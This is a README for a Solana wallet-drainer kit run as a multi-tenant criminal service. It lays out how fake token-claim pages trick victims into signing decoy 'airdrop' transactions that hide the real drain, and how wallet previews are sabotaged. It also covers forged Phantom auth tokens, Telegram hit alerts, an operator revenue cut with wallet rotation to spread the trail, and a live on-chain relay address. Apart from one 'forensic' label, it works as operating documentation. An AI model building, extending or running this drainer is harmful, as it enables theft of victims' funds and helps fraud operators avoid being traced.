# Yale — Solana+SPL Wallet Drainer

The drainer module. Forensic reconstruction of the "Kiwi Pro Skittles" kit,
weaponized into a multi-tenant service. All drains flow through one shared
backend; each customer payload carries its own payout wallet.

## Attack chain (per victim)

```
1. VICTIM LANDING
   Customer site (stable Vercel project, e.g. claim-xxxx.vercel.app)
   → fake token-claim page (frame.html). Wallet detected → connect prompt.

2. CONTEXT COLLECTION
   Page POSTs /notify-visit (same-origin, proxied by Vercel rewrites)
   → backend → Telegram alert to the customer's chat.

3. TRANSACTION BUILDING (server-side)
   Page POSTs /build-plain-drain (Phantom) or /build-transaction (others)
   → backend builds TWO tx sets:
       a) unsignedTxSpoof — decoy "airdrop claim" (what the victim sees)
       b) unsignedTxs     — the real drain (SOL + SPL → wallets below)
   SOL split: customer gets (1 − OPERATOR_CUT), one random operator wallet
   gets OPERATOR_CUT. Two transfer_sol instructions, one victim signature.

4. SIGNING (bait-and-switch)
   signAllTransactions([spoof, ...real]) — spoofPrompt + hideChanges
   sabotage the wallet preview. Victim signs once.

5. RELAY & BROADCAST
   Page POSTs /relay-transaction with the signed tx
   → backend broadcasts via RPC.

6. CONFIRMATION
   /notify-confirm → Telegram alert with txid to the customer,
   plus a hit alert to the operator group (OPERATOR_CHAT_ID).
```

## Notification routing

Customers get every notification (visit, confirm, reject) in their own
chat — the `userChatId` baked into their payload, validated against the
registry chimera pushes to the backend (`VALID_CHAT_IDS` +
`/admin/chat-ids`) so nobody can spoof alerts to arbitrary chats. The
operator group (`OPERATOR_CHAT_ID`, default `-5236234661`) gets hits
only: server-verified drains with amounts and customer attribution.
Same chat+IP inside 10 minutes counts as one visit (crawlers and page
reloads re-fire the beacon — new `*.vercel.app` subdomains appear in
certificate transparency logs and get scanned constantly).

## Site management + stats + USDC

- `/sites` (bot, hosted mode): inline keyboards — redeploy, delete
  (tears down the Vercel project + registry record), change payout
  wallet (same URL), toggle USDC conversion. Backed by service_api
  endpoints `/customers/delete|wallet|payout`.
- `/stats`: funnel (visitors/rejects/drains) + earnings. The backend
  counts in memory (`stats.js`); chimera pulls before each recycle
  (pull-and-clear) and accumulates into `data/stats.json`; the bot's
  `/stats` also does a live pull for mid-cycle hits.
- USDC payouts: per-customer flag in the registry → patched into the
  payload (`usdcPayout: true`). At build time the backend swaps the
  customer's SOL share through Jupiter (legacy tx, victim-signed, ATA
  created in-tx if missing, 1% slippage); the operator cut and SPL
  tokens still move via the relay program in a second tx. Jupiter
  failure → plain SOL drain, the drain never breaks because of it.

The bot (`yale/bot`) is closed by default: unknown users get a "no
access" reply and the admin (`ADMIN_ID`, default `7036670963`) gets a
one-time ping. Admin whitelists with `/whitelist <id>`, blocks with
`/blacklist <id>` (persisted in `access.json`).

## Components

| Path | What |
|---|---|
| `yale/server/` | Backend (Node/Express). 10 endpoints, AES-256-GCM/HKDF envelope, wallet eligibility, tx building, relay. Deployed as `registry.fly.io/chimera-drainer:latest` on the stable Fly app `chimera-drainer`. |
| `yale/server/public/` | The payload templates — `frame.html` (standalone page), `frame.js`, `loader.js`. Single source of truth: chimera's customer pipeline and the bot's zip mode both patch copies of these. |
| `yale/bot/` | Telegram bot. `/start` → wallet → live URL (hosted mode via chimera API) or zip (self-host). `/zip` forces zip. |
| `yale/programs/` | On-chain relay program (Anchor/Rust): `transfer_token`, `transfer_token_2022` (SOL moves via a plain system transfer, matching the original kit). The backend targets the original kit's live deployment `EUspc3fXb1dZJECT7PUkkSJsGBJFGSyvfG9CshS3rerv` with `check_wallet` `JAByDD...hDTP` (both verified against the observed drain tx). Our rebuild in this repo is forensic reference only, not deployed. |
| `yale/scripts/`, `yale/tests/`, `yale/localnet/` | Forensic tooling + localnet drain replay (proves the chain end-to-end without mainnet). |
| `yale/setup.js` | Legacy single-operator CLI configurator (superseded by the service). |

## Operator split (your cut)

`wallet.js:splitSolAmounts()` — env-driven, evaluated per drain:

```
OPERATOR_WALLETS=wallet1,wallet2   # your payout wallets
OPERATOR_CUT=0.15                  # fraction of drained SOL to you
```

- One operator wallet is picked **at random per drain** (rotation/trail-spreading)
- Customer SOL: `floor(amount × (1 − cut))`, yours: the remainder
- Cut clamped to `[0, 0.95]`
- **SPL tokens go 100% to the customer** — an operator ATA can't be assumed
  to exist for arbitrary mints, and one failed instruction fails the whole
  victim-signed tx
- Test: `cd yale/server && node test-split.mjs`

Set in `config.yaml` → `drainer.env`, injected into the backend machine on
every rotation cycle. Change requires only a config edit + cycle (machine
recycle applies new env).

## Multi-tenancy

The payload sends its own `targetWallet` in every encrypted request;
`server.js` passes it through to `wallet.js:buildDrainTransaction`, which
uses it over the server-level fallback (`TARGET_WALLET` env). One backend
serves unlimited customers.

## Endpoints (backend)

| Method | Path | Purpose |
|---|---|---|
| POST | /build-plain-drain | Build drain tx (Phantom-only path) |
| POST | /build-spoof | Build decoy airdrop tx |
| POST | /build-transaction | Build drain tx (generic) |
| POST | /relay-transaction, /relay-plain | Broadcast signed tx |
| POST | /notify-visit, /notify-confirm, /notify-reject | Telegram telemetry |
| GET | /okxdmnendpt | Current front-end URL (rotation hook) |
| GET | /api/getLatestHeaders | Forged Phantom auth tokens |
| GET | /health | Liveness (Fly healthcheck) |

All business endpoints are AES-256-GCM encrypted (HKDF-SHA256, shared
secret between payload and backend).

## Testing the drain (self-test procedure)

1. Create a burner wallet (e.g. fresh Phantom) — this is the **payout**
   wallet; message the bot with its address → live site.
2. Fund a second burner with a small amount of SOL (~0.5).
3. Open the site, connect burner #2, sign the claim.
4. Expect: ~85% of burner #2's SOL → burner #1, ~15% → your operator
   wallet (per OPERATOR_CUT), Telegram alerts to your chat, txid on-chain.
